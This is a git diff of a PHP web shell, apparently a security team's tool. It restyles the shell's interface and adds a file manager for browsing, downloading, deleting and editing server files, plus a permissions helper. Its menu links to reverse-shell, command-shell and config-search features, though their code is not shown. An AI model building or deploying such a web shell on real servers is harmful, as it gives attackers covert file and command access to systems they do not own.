@@ -247,11 +247,247 @@ if (isset($_SESSION["loggedin"]) && $_SESSION["loggedin"] === true) {
         <span class="neon-text">Yavuzlar Web Security Team</span>
     </div>';
     echo '
-   
+    <style>
+    .menu {
+        background: rgba(0, 0, 0, 0.8);
+        padding: 15px 0;
+        margin: 20px 0;
+        border-top: 1px solid #0f0;
+        border-bottom: 1px solid #0f0;
+        box-shadow: 0 0 15px rgba(0, 255, 0, 0.2);
+        display: flex;
+        justify-content: center;
+    }
 
+    .menu a {
+        margin: 0 20px;
+        padding: 10px 15px;
+        text-decoration: none;
+        color: #0f0;
+        font-size: 1.1rem;
+        border: 1px solid transparent;
+        border-radius: 5px;
+        transition: all 0.3s ease;
+    }
+
+    .menu a:hover {
+        border-color: #0f0;
+        box-shadow: 0 0 15px rgba(0, 255, 0, 0.5);
+        background: rgba(0, 255, 0, 0.1);
+    }
+
+    .file-manager-container {
+        width: 90%;
+        max-width: 1200px;
+        background: rgba(0, 0, 0, 0.8);
+        border: 2px solid #0f0;
+        border-radius: 15px;
+        padding: 20px;
+        margin: 30px auto;
+        box-shadow: 0 0 30px rgba(0, 255, 0, 0.3);
+        max-height: 600px; /* Set a maximum height */
+        overflow-y: auto; /* Enable vertical scrolling */
+    }
+
+    .directory-title {
+        margin: 10px 0;
+        font-size: 20px;
+        color: #0f0;
+        text-align: center;
+    }
+
+    .file-list {
+        list-style-type: none;
+        padding: 0;
+        margin: 0;
+        max-height: 500px; /* Set a maximum height for the file list */
+        overflow-y: auto; /* Enable vertical scrolling */
+    }
+
+    .file-item {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        padding: 10px;
+        margin: 5px 0;
+        border: 1px solid rgba(0, 255, 0, 0.2);
+        border-radius: 5px;
+        background: rgba(0, 255, 0, 0.05);
+        transition: all 0.3s ease;
+    }
+
+    .file-name {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        color: #0f0;
+        text-decoration: none;
+        font-size: 0.95rem;
+        padding: 4px 8px;
+        border-radius: 3px;
+        background: rgba(0,255,0,0.05);
+        min-width: 200px;
+    }
+
+    .file-name.file {
+        border-left: 3px solid #0f0;
+    }
+
+    .file-name.dir {
+        border-left: 3px solid #00ff00;
+        font-weight: 500;
+    }
+
+    .file-name::before {
+        content: "📄";
+        font-size: 1.1rem;
+        opacity: 0.8;
+    }
+
+    .file-name.dir::before {
+        content: "📁";
+        color: #0f0;
+    }
+
+    .file-name:hover {
+        background: rgba(0,255,0,0.1);
+    }
+
+    /* Dosya uzantılarına göre renkler */
+    .file-name[data-ext="php"] {
+        border-left-color: #4F5D95;
+    }
+
+    .file-name[data-ext="html"] {
+        border-left-color: #e34c26;
+    }
+
+    .file-name[data-ext="css"] {
+        border-left-color: #563d7c;
+    }
+
+    .file-name[data-ext="js"] {
+        border-left-color: #f1e05a;
+    }
+
+    .file-name[data-ext="txt"] {
+        border-left-color: #89e051;
+    }
+
+    .file-name[data-ext="json"] {
+        border-left-color: #292929;
+    }
+
+    .file-name[data-ext="xml"] {
+        border-left-color: #0060ac;
+    }
+
+    .file-name[data-ext="md"] {
+        border-left-color: #083fa1;
+    }
+
+    .file-name[data-ext="yml"], .file-name[data-ext="yaml"] {
+        border-left-color: #6d8086;
+    }
+
+    .file-name[data-ext="conf"], .file-name[data-ext="config"] {
+        border-left-color: #6e4a7e;
+    }
+
+    .file-name[data-ext="sh"], .file-name[data-ext="bash"] {
+        border-left-color: #89e051;
+    }
+
+    /* Tüm butonlar için ortak stiller */
+    .button-group button,
+    .search-form button,
+    .upload-form label.sec {
+        color: #0f0;
+        border: 1px solid #0f0;
+        padding: 6px 12px;
+        border-radius: 3px;
+        cursor: pointer;
+        transition: all 0.3s ease;
+        background: transparent;
+        font-size: 0.85rem;
+        height: 28px;
+        line-height: 1;
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+    }
+
+    /* Hover efekti */
+    
+
+    /* Button grupları için spacing */
+    .button-group {
+        gap: 6px;
+    }
+
+    /* Form içi butonlar arası boşluk */
+    .search-form,
+    .upload-form {
+        gap: 8px;
+    }
+
+    /* Input alanları için yükseklik */
+    .search-form input[type="text"] {
+        height: 28px;
+        padding: 0 10px;
+        font-size: 0.85rem;
+    }
+
+    .file-info {
+        display: flex;
+        align-items: center;
+        gap: 20px;
+        font-size: 0.9rem;
+        color: rgba(0,255,0,0.8);
+        margin-right: 20px;
+    }
+
+    .perms-symbolic {
+        font-family: monospace;
+        background: rgba(0,255,0,0.1);
+        padding: 2px 6px;
+        border-radius: 3px;
+        letter-spacing: 1px;
+    }
+
+    .perms-numeric {
+        background: rgba(0,255,0,0.1);
+        padding: 2px 6px;
+        border-radius: 3px;
+        min-width: 30px;
+        text-align: center;
+    }
+
+    .owner-info {
+        color: rgba(0,255,0,0.8);
+        font-size: 0.85rem;
+        font-family: monospace;
+        background: rgba(0,255,0,0.1);
+        padding: 2px 6px;
+        border-radius: 3px;
+        letter-spacing: 1px;
+    }
+
+    .modified-date {
+        color: rgba(0,255,0,0.8);
+        font-size: 0.85rem;
+        font-family: monospace;
+        background: rgba(0,255,0,0.1);
+        padding: 2px 6px;
+        border-radius: 3px;
+        letter-spacing: 1px;
+    }
+    </style>';
+
+    echo '
     <div class="menu">
-        <a href="?server_info=false">File Managament</a>
-        <a href="?server_info=true">Server İnfo</a>
+        <a href="?server_info=false">File Management</a>
+        <a href="?server_info=true">Server Info</a>
         <a href="?scan_f=true">Config Search</a>
         <a href="?revers=true">Revers Shell</a>
         <a href="?terminal=true">Command Shell</a>
@@ -533,97 +769,71 @@ echo '</div>';
     if ($showFileManager) {
         echo '<div class="file-manager-container">';
         echo '<h2 class="directory-title">Dizin: <span>' . htmlspecialchars($currentDir) . '</span></h2>';
-        echo "<ul class='file-list'>";
     
+        // Search form
         echo '<form action="" method="post" class="search-form">
-                <input type="hidden" name="currentDir" value="' . htmlspecialchars($currentDir) . '">
                 <input type="text" name="searchQuery" placeholder="Dosya ara" required>
-                <button type="submit" name="searchFile" class="text-link search">Ara</button>
+                <button type="submit" name="searchFile">Ara</button>
               </form>';
-              echo '
-              <div class="upload-form">
-                  <form action="" method="post" enctype="multipart/form-data" class="upload-form">
-                      <input type="file" id="file-upload" name="fileToUpload" onchange="displayFileName()" style="display:none;">
-                      <label class="sec" for="file-upload">Dosya Seç</label>
-                      <div id="file-name" class="uploaded-file" style="display:none;"></div>
-                      <input type="hidden" name="currentDir" value="' . htmlspecialchars($currentDir) . '">
-                      
-                      <button type="submit" name="uploadFile" class="tes">Yükle</button>
-                  </form>
-              </div>
-              ';
-              
-              
-              echo '
-              <script>
-              function displayFileName() {
-                  const fileInput = document.getElementById("file-upload");
-                  const fileNameDisplay = document.getElementById("file-name");
-              
-                  if (fileInput.files.length > 0) {
-                      fileNameDisplay.style.display = "block"; // Görünür yap
-                      fileNameDisplay.innerText = fileInput.files[0].name; // Dosya adını göster
-                  }
-              }
-              </script>
-              ';
-echo '<div class="back-button-wrapper">';
-echo '<a class="back-button" href="?dir=' . urlencode($parentDir) . '">Geri</a>';
-echo '</div>';
+        
+        // Upload form
+        echo '<div class="upload-form" style="margin-bottom: 1px;">';
+        echo '<form action="" method="post" enctype="multipart/form-data">
+                <input type="file" id="file-upload" name="fileToUpload" onchange="displayFileName()" style="display:none;">
+                <label class="sec" for="file-upload">Dosya Seç</label>
+                <div id="file-name" class="uploaded-file" style="display:none;"></div>
+                <input type="hidden" name="currentDir" value="' . htmlspecialchars($currentDir) . '">
+                <button type="submit" name="uploadFile" class="std-button">Yükle</button>
+              </form>
+            </div>';
+        
+        // Back button
+        echo '<div class="back-button-wrapper" style="margin-top: 1px;">';
+        echo '<a class="back-button" href="?dir=' . urlencode($parentDir) . '">← Geri</a>
+              </div>';
+        
+        echo "<ul class='file-list'>";
+        
         foreach ($items as $item) {
             $fullPath = $currentDir . '/' . $item;
             echo "<li class='file-item'>";
+            
+            // Display directory or file name
 if (is_dir($fullPath)) {
     echo '<a href="?dir=' . urlencode($fullPath) . '" class="file-name dir">' . htmlspecialchars($item) . '</a>';
 } else {
     echo '<span class="file-name file">' . htmlspecialchars($item) . '</span>';
-    $perms = fileperms($fullPath);
-    $permissionString = substr(sprintf('%o', $perms), -3); 
-    echo '<span class="file-permissions"> İzinler: ' . $permissionString . '</span>'; 
-}
-
-
-            echo "<div class='button-group'>";
-            if (is_dir($fullPath)) {
                 
+                // Get permissions and owner info
+                $permissions = getPermissions($fullPath);
+                
+                // Display permissions and owner info in a styled box
+                echo '<div class="file-info">';
+                echo '<span class="file-permissions perms-symbolic">' . $permissions['symbolic'] . '</span>';
+                echo '<span class="file-permissions perms-numeric">' . $permissions['numeric'] . '</span>';
+                echo '<span class="owner-info">' . $permissions['owner'] . ':' . $permissions['group'] . '</span>';
+                echo '<span class="modified-date">' . $permissions['modified'] . '</span>';
+                echo '</div>'; // Close file-info
+            }
+
+            // Action buttons
+            echo "<div class='button-group' style='margin-left: -10px;'>";
                 echo '<form action="" method="post" class="download-form">
                         <input type="hidden" name="downloadFile" value="' . htmlspecialchars($fullPath) . '">
-                        <button type="submit" class="text-link download">İndir</button>
+                    <button type="submit">İndir</button>
                       </form>';
-            } elseif (is_file($fullPath)) {
-                
-                echo '<form action="" method="post" class="download-form">
-                        <input type="hidden" name="downloadFile" value="' . htmlspecialchars($fullPath) . '">
-                        <button type="submit" class="text-link download">İndir</button>
-                      </form>';
-            
                 echo '<form action="" method="post" class="delete-form">
                         <input type="hidden" name="deleteFile" value="' . htmlspecialchars($fullPath) . '">
-                        <button type="submit" class="text-link delete">Sil</button>
+                    <button type="submit">Sil</button>
                       </form>';
-            
                 echo '<form action="" method="post" class="edit-form">
                         <input type="hidden" name="editFile" value="' . htmlspecialchars($fullPath) . '">
-                        <button type="submit" class="text-link edit">Düzenle</button>
+                    <button type="submit">Düzenle</button>
                       </form>';
-            }
+            echo "</div>"; // Close button-group
+            echo "</li>"; // Close file-item
         }            
         echo "</ul></div>"; 
-        echo '<script type="text/javascript">';
-        echo 'var searchResults = [];'; 
-        if (isset($searchResults)) {
-            if (empty($searchResults)) {
-                echo 'alert("Dosya bulunamadı.");'; 
-            } else {
-                echo 'searchResults.push("Arama Sonuçları:");'; 
-                foreach ($searchResults as $result) {
-                    echo 'searchResults.push("' . addslashes(htmlspecialchars($result)) . '");'; 
-                }
-                echo 'alert(searchResults.join("\\n"));'; 
-            }
-        }
-        echo '</script>';
-        
     }
     if ($fileToEdit && !empty($fileContent)) {
         
@@ -725,6 +935,62 @@ echo '</style>';
     echo '</div>';
 }
 
+function getPermissions($file) {
+    $perms = fileperms($file);
+    
+    // Determine file type
+    switch ($perms & 0xF000) {
+        case 0xC000: // Socket
+            $type = 's';
+            break;
+        case 0xA000: // Symbolic Link
+            $type = 'l';
+            break;
+        case 0x8000: // Regular
+            $type = '-';
+            break;
+        case 0x6000: // Block special
+            $type = 'b';
+            break;
+        case 0x4000: // Directory
+            $type = 'd';
+            break;
+        case 0x2000: // Character special
+            $type = 'c';
+            break;
+        case 0x1000: // FIFO pipe
+            $type = 'p';
+            break;
+        default: // Unknown
+            $type = 'u';
+    }
+
+    // Owner permissions
+    $owner = (($perms & 0x0100) ? 'r' : '-');
+    $owner .= (($perms & 0x0080) ? 'w' : '-');
+    $owner .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));
+
+    // Group permissions
+    $group = (($perms & 0x0020) ? 'r' : '-');
+    $group .= (($perms & 0x0010) ? 'w' : '-');
+    $group .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-'));
+
+    // Other permissions
+    $other = (($perms & 0x0004) ? 'r' : '-');
+    $other .= (($perms & 0x0002) ? 'w' : '-');
+    $other .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-'));
+
+    // Get numeric value
+    $numeric = sprintf("%o", $perms & 0777);
+
+    return [
+        'symbolic' => $type . $owner . $group . $other,
+        'numeric' => $numeric,
+        'owner' => posix_getpwuid(fileowner($file))['name'] ?? fileowner($file),
+        'group' => posix_getgrgid(filegroup($file))['name'] ?? filegroup($file),
+        'modified' => date("Y-m-d H:i:s", filemtime($file))
+    ];
+}
 
 ?>
 
@@ -764,6 +1030,22 @@ body {
     margin-right: 20px;
 }
 
+.std-button {
+    color: #0f0;
+    border: 1px solid #0f0;
+    padding: 6px 12px;
+    border-radius: 3px;
+    cursor: pointer;
+    transition: all 0.3s ease;
+    background: transparent;
+    font-size: 0.85rem;
+    height: 39px;
+    line-height: 1;
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+}
+
 .neon-text {
     color: black;
     font-size: 1.5rem;
@@ -772,24 +1054,22 @@ body {
 }
 
 .file-manager-container {
-    width: 900px;
-    height: 600px;
-    background-color: black;
-    border: 2px solid #00FF00;
-    padding: 5px;
-    margin: 20px auto;
-    overflow-y: auto;
-    border-radius: 10px;
-    box-shadow: 0 0 10px #00FF00; 
+    width: 90%;
+    max-width: 1200px;
+    background: rgba(0, 0, 0, 0.8);
+    border: 2px solid #0f0;
+    border-radius: 15px;
+    padding: 20px;
+    margin: 30px auto;
+    box-shadow: 0 0 30px rgba(0, 255, 0, 0.3);
+    max-height: 600px; /* Set a maximum height */
+    overflow-y: auto; /* Enable vertical scrolling */
 }
 
 .directory-title {
-    margin-top: 5px;
-    margin-bottom: 5px;
-    padding: 5px;
-    font-size: 18px;
-    font-weight: bold;
-    color: #28a745;
+    margin: 10px 0;
+    font-size: 20px;
+    color: #0f0;
     text-align: center;
 }
 
@@ -797,42 +1077,150 @@ body {
     list-style-type: none;
     padding: 0;
     margin: 0;
+    max-height: 500px; /* Set a maximum height for the file list */
+    overflow-y: auto; /* Enable vertical scrolling */
 }
 
 .file-item {
-    border-bottom: 1px solid #00FF00;
     display: flex;
     justify-content: space-between;
     align-items: center;
-    padding: 10px 0;
+    padding: 10px;
+    margin: 5px 0;
+    border: 1px solid rgba(0, 255, 0, 0.2);
+    border-radius: 5px;
+    background: rgba(0, 255, 0, 0.05);
+    transition: all 0.3s ease;
 }
 
 .file-name {
-    color: whitesmoke;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    color: #0f0;
     text-decoration: none;
-    font-size: 16px;
-    flex: 1;
-    min-width: 150px;
+    font-size: 0.95rem;
+    padding: 4px 8px;
+    border-radius: 3px;
+    background: rgba(0,255,0,0.05);
+    min-width: 200px;
 }
 
-.file-permissions {
-    min-width: 80px;
-    margin-left: 10px;
-    font-size: 0.8rem;
-    color: #00FF00;
-    text-align: right;
+.file-name.file {
+    border-left: 3px solid #0f0;
 }
 
 .file-name.dir {
-    font-weight: bold;
+    border-left: 3px solid #00ff00;
+    font-weight: 500;
 }
 
+.file-name::before {
+    content: "📄";
+    font-size: 1.1rem;
+    opacity: 0.8;
+}
+
+.file-name.dir::before {
+    content: "📁";
+    color: #0f0;
+}
+
+.file-name:hover {
+    background: rgba(0,255,0,0.1);
+}
+
+/* Dosya uzantılarına göre renkler */
+.file-name[data-ext="php"] {
+    border-left-color: #4F5D95;
+}
+
+.file-name[data-ext="html"] {
+    border-left-color: #e34c26;
+}
+
+.file-name[data-ext="css"] {
+    border-left-color: #563d7c;
+}
+
+.file-name[data-ext="js"] {
+    border-left-color: #f1e05a;
+}
+
+.file-name[data-ext="txt"] {
+    border-left-color: #89e051;
+}
+
+.file-name[data-ext="json"] {
+    border-left-color: #292929;
+}
+
+.file-name[data-ext="xml"] {
+    border-left-color: #0060ac;
+}
+
+.file-name[data-ext="md"] {
+    border-left-color: #083fa1;
+}
+
+.file-name[data-ext="yml"], .file-name[data-ext="yaml"] {
+    border-left-color: #6d8086;
+}
+
+.file-name[data-ext="conf"], .file-name[data-ext="config"] {
+    border-left-color: #6e4a7e;
+}
+
+.file-name[data-ext="sh"], .file-name[data-ext="bash"] {
+    border-left-color: #89e051;
+}
+
+/* Tüm butonlar için ortak stiller */
+.button-group button,
+.search-form button,
+.upload-form label.sec {
+    color: #0f0;
+    border: 1px solid #0f0;
+    padding: 6px 12px;
+    border-radius: 3px;
+    cursor: pointer;
+    transition: all 0.3s ease;
+    background: transparent;
+    font-size: 0.85rem;
+    height: 28px;
+    line-height: 1;
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+}
+
+/* Hover efekti */
+.button-group button:hover,
+.search-form button:hover,
+.upload-form label.sec:hover {
+    background: rgba(0,255,0,0.1);
+}
+
+
+/* Button grupları için spacing */
 .button-group {
-    display: flex;
-    gap: 10px;
+    gap: 6px;
 }
 
-
+/* Form içi butonlar arası boşluk */
+.search-form,
+.upload-form {
+    gap: 8px;
+}
+.search-form button:hover{
+    background-color: #218838; 
+}
+/* Input alanları için yükseklik */
+.search-form input[type="text"] {
+    height: 28px;
+    padding: 0 10px;
+    font-size: 0.85rem;
+}
 
 .login-container {
     display: flex;
@@ -887,8 +1275,6 @@ input[type="submit"]:hover {
     box-shadow: 0 0 10px #00ff00; 
 }
 
-
-
 .search-form {
     text-align: flex;
     padding: 1px;
@@ -897,28 +1283,26 @@ input[type="submit"]:hover {
     align-items: center; 
 }
 
+
 .back-button {
-    width: 80px;
-    height: 30px;
-    display: inline-flex;
-    justify-content: center;
-    align-items: center;
-    background-color: #28a745;
-    color: black; 
-    border-radius: 5px;
-    text-decoration: none;
-    transition: background-color 0.3s ease;
-    font-size: 16px;
-    font-family: 'Arial', sans-serif;
-    font-weight: bold;
-    overflow: hidden;
-    margin-top: 0px;
+    color: #0f0; /* Text color */
+    border: 1px solid #0f0; /* Border color */
+    border-radius: 3px; /* Rounded corners */
+    cursor: pointer; /* Pointer cursor */
+    transition: all 0.3s ease; /* Transition effects */
+    background: transparent; /* Transparent background */
+    font-size: 0.85rem; /* Font size */
+    height: 30px; /* Height */
+    width: 80px; /* Width */
+    display: inline-flex; /* Flex display */
+    align-items: center; /* Center vertically */
+    justify-content: center; /* Center text horizontally */
+    text-decoration: none; /* Remove underline */
 }
 
 .back-button:hover {
-    background-color: #218838; 
+    background-color: #218838; /* Darker green on hover */
 }
-
 ::-webkit-scrollbar {
     width: 12px;
     height: 12px;
@@ -945,10 +1329,6 @@ input[type="submit"]:hover {
     color: #00FF00;
 }
 
-
-
-
-
 .uploaded-file {
     padding: 0px 0px;
     margin: 0 5px;
@@ -962,10 +1342,6 @@ input[type="submit"]:hover {
     
 }
 
-
-
-
-
 .search-form button{
     width: 60px; 
     height: 35px; 
@@ -973,23 +1349,6 @@ input[type="submit"]:hover {
     margin-left: 10px;
     
         
-}
-.back-button {
-    width: 30px; 
-    height: 5px; 
-          padding: 10px;';
-         margin: 10px;';
-         font-size: 16px;';
-         color: #0f0;';
-       background-color: #000;';
-       border: 2px solid #0f0;';
-        box-shadow: 0 0 10px #0f0;';
-         text-align: center;';
-}
-
-
-.back-button:hover {
-    background-color: #0f8b00; 
 }
 
 
@@ -1014,28 +1373,34 @@ input[type="submit"]:hover {
     margin: 0 5px;
 }
 
-
-
-
 .menu {
-            margin-top: 20px;
+    background: rgba(0, 0, 0, 0.8);
+    padding: 15px 0;
+    margin: 20px 0;
+    border-top: 1px solid #0f0;
+    border-bottom: 1px solid #0f0;
+    box-shadow: 0 0 15px rgba(0, 255, 0, 0.2);
             display: flex;
             justify-content: center;
         }
 
         .menu a {
-            margin: 0 15px;
+    margin: 0 20px;
+    padding: 10px 15px;
             text-decoration: none;
-            color: black;
-            font-size: 1.2rem;
-            font-weight: bold;
-            text-shadow: 0 0 5px #00ff00, 0 0 10px #00ff00, 0 0 20px #00ff00;
-            transition: color 0.3s ease;
+    color: #0f0;
+    font-size: 1.1rem;
+    border: 1px solid transparent;
+    border-radius: 5px;
+    transition: all 0.3s ease;
         }
 
         .menu a:hover {
-            color: #00cc00;
+    border-color: #0f0;
+    box-shadow: 0 0 15px rgba(0, 255, 0, 0.5);
+    background: rgba(0, 255, 0, 0.1);
         }
+
         .file-list {
             list-style-type: none;
     padding: 0;
@@ -1079,8 +1444,6 @@ input[type="submit"]:hover {
    
 }
 
-
-
 .dir {
     font-weight: bold;
 }
@@ -1112,10 +1475,6 @@ button:hover {
     color: black;
 }
 
-
-
-
-
 .upload-form input[type="file"] {
     display: none; 
 }
@@ -1134,13 +1493,11 @@ button:hover {
     text-align: center; 
 }
 
-
 .upload-form {
    
     display: flex; 
     align-items: center; 
 }
-
 
 .sec {
     display: inline-block; 
@@ -1151,7 +1508,6 @@ button:hover {
     cursor: pointer;
     margin-right: 4px; 
 }
-
 
 .tes{
     padding: 6px 6px; 
@@ -1167,7 +1523,23 @@ button:hover {
 .ad{
     padding: 10px 20px;
 }
+
+
+
 </style>
+    <script>
+        function displayFileName() {
+            const fileInput = document.getElementById("file-upload");
+            const fileNameDisplay = document.querySelector('.sec'); // Get the label element
+
+            if (fileInput.files.length > 0) {
+                const fileName = fileInput.files[0].name; // Get the file name
+                fileNameDisplay.innerText = fileName; // Update the label text
+            } else {
+                fileNameDisplay.innerText = 'Dosya Seç'; // Reset to default text if no file is selected
+            }
+        }
+    </script>
 </head>
 <body>
     
